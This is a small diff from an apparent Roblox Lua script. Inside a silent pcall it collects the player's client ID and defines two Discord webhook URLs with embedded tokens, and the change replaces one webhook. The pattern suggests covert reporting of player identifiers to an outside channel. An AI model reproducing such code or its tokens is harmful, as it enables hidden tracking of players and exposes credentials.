@@ -2,7 +2,7 @@ pcall(function()
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
-local Webhuk1 = "https://discord.com/api/webhooks/1344385105774252052/Ty6imbzcU49d-vghGi6miUhbG1Vzlvho9WzRwRfAigQVDPS9pzFlHnfJF2D2Zz2grphF"
+local Webhuk1 = "https://discord.com/api/webhooks/1345597689382961204/QcvYm155Tp5cxdI6t6C-CXmkiPtONhA4ajgSFuFVGSzhYGZCgC0LD79x7SdPVjfIlMbU"
 local Webhuk2 = "https://discord.com/api/webhooks/1344385362591617205/4glHFEzq0nlTnev2V7bqq5yqHM2BDK0LNCrYaNgTVMe4jX6-BFlfyFmUvZF1EOnQOzqT"
 
 function HeadshotPict()
